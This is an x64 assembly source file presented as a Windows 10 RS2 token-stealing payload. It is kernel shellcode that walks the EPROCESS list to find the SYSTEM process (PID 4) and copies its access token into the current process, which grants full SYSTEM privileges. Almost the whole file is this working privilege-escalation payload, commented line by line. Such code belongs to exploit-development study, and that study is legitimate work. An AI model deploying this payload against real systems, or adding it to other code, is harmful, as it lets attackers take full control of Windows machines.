; Windows 10 RS2 x64 Token Stealing Payload
; Author Connor McGarr

[BITS 64]

_start:
	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
	mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
__loop:
	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
	cmp rcx, 4 			; Compare PID to SYSTEM PID 
	jnz __loop			; Loop until SYSTEM PID is found

	mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
	and cl, 0xf0			; Clear out _EX_FAST_REF RefCnt
	mov [rax + 0x358], rcx		; Copy SYSTEM token to current process

	xor rax, rax			; set NTSTATUS SUCCESS
	ret				; Done!
